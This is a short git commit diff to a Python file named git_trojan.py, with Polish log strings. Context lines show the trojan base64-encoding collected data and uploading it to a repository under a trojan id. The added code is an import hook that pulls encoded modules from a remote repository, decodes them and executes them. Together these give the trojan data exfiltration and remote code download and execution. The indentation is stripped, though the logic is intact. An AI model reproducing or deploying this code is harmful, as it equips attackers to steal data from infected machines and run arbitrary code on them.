cc3d11949b5c17c8efcb8b39c2666d7f577482c9
jakubekwolodyjowski <bolt.2@o2.pl>
2017-04-04 18:57:00 +0100

    Update git_trojan.py

--- git_trojan.py
+++ git_trojan.py
@@ -48,3 +48,19 @@ remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
 repo.create_file(remote_path,"Wiadomość o zatwierdzeniu",base64.
 b64encode(data))
 return
+class GitImporter(object):
+def __init__(self):
+self.current_module_code = ""
+def find_module(self,fullname,path=None):
+if configured:
+print "[*] Próba pobrania %s" % fullname
+new_library = get_file_contents("modules/%s" % fullname)
+if new_library is not None:
+self.current_module_code = base64.b64decode(new_library)
+return self
+return None
+def load_module(self,name):
+module = imp.new_module(name)
+exec self.current_module_code in module.__dict__
+sys.modules[name] = module
+return module
